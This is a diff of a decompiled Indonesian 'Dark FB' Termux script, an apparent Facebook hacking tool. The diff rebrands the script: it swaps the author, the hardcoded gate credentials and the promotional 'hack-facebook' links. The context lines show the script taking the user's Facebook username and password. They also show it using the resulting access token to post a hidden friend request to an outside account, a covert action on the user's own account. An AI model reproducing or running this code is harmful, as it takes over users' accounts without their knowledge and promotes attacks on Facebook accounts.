@@ -1,11 +1,10 @@
-#decompiled by PDM31
 import os, sys
-print '\x1b[1;32mSudah punya ID dan Password nya?'
-print '\x1b[1;32mSilahkan Login '
+print '\x1b[1;32mSudah punya ID dan PASS untuk masuk SC ini?'
+print '\x1b[1;32mSilahkan Login (bukan login fb) '
 import os, sys
 
 def wa():
-    os.system('xdg-open https://api.whatsapp.com/send?phone=6281291977644&text=Assalamualaikum')
+    os.system('xdg-open https://https://omalip.com/id-dan-pass-script-dark-fb')
 
 
 def restart():
@@ -15,12 +14,12 @@ def restart():
 
 user = raw_input('ID: ')
 import getpass
-sandi = raw_input('Password: ')
-if sandi == 'indoxploit' and user == 'Borot':
-    print 'Anda Telah Login'
+sandi = raw_input('PASS: ')
+if sandi == 'omaliptv' and user == 'Termux':
+    print 'Anda Telah Login Dan Untuk Panduan Menggunakan Baca POstingan BErikut'
     sys.exit
 else:
-    print 'Login GAGAL, Silahkan hubungi ADMIN'
+    print 'Login GAGAL, Silahkan Cari Tau ID dan PASS nya di WEB berikut'
     wa()
     restart()
 import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib
@@ -56,7 +55,7 @@ def jalan(z):
         time.sleep(0.1)
 
 
-logo = '\x1b[1;92m\n\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80   \xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97 \n \xe2\x95\x91\xe2\x95\x91\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xa0\xe2\x95\xa3 \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97\n\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4 \xe2\x94\xb4   \xe2\x95\x9a  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \x1b[1;93mv1.7\n\x1b[1;93m* \x1b[1;97mAuthor  \x1b[1;91m: \x1b[1;96mMas Uzie\x1b[1;97m\n\x1b[1;93m* \x1b[1;97mSupport \x1b[1;91m: \x1b[1;96mKunjungi\x1b[1;97m \x1b[1;96mwebsite \x1b[1;96mKami\n\x1b[1;93m* \x1b[1;97mwebsite  \x1b[1;91m: \x1b[1;92m\x1b[4mhttp://uzie.xyz/\x1b[0m\n'
+logo = '\x1b[1;92m\n\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80   \xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97 \n \xe2\x95\x91\xe2\x95\x91\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xa0\xe2\x95\xa3 \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97\n\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4 \xe2\x94\xb4   \xe2\x95\x9a  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \x1b[1;93mv1.7\n\x1b[1;93m* \x1b[1;97mAuthor  \x1b[1;91m: \x1b[1;96mAyipBontos\x1b[1;97m\n\x1b[1;93m* \x1b[1;97mSupport \x1b[1;91m: \x1b[1;96mKunjungi\x1b[1;97m \x1b[1;96mwebsite \x1b[1;96mKami\n\x1b[1;93m* \x1b[1;97mwebsite  \x1b[1;91m: \x1b[1;92m\x1b[4mhttps://termux.id\x1b[0m\n'
 
 def tik():
     titik = [
@@ -97,7 +96,7 @@ def login():
         os.system('reset')
         print logo
         print 40 * '\x1b[1;97m\xe2\x95\x90'
-        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN AKUN FACEBOOK \x1b[1;91m[\xe2\x98\x86]'
+        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN AKUN FACEBOOK KALIAN\x1b[1;91m[\xe2\x98\x86]'
         id = raw_input('\x1b[1;91m[+] \x1b[1;36mUsername \x1b[1;91m:\x1b[1;92m ')
         pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword \x1b[1;91m:\x1b[1;92m ')
         tik()
@@ -129,7 +128,7 @@ def login():
                 zedd.close()
                 print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
-                os.system('xdg-open http://uzie.xyz/hack-facebook/')
+                os.system('xdg-open https://termux.id/cara-hack-facebook-menggunakan-termux-script-dark-fb/')
                 time.sleep(2)
                 menu()
             except requests.exceptions.ConnectionError:
@@ -209,7 +208,7 @@ def pilih():
                     else:
                         if zedd == '5':
                             os.system('rm -rf login.txt')
-                            os.system('xdg-open http://uzie.xyz/hack-facebook')
+                            os.system('xdg-open https://termux.id/cara-hack-facebook-menggunakan-termux-script-dark-fb/')
                             keluar()
                         else:
                             if zedd == '0':
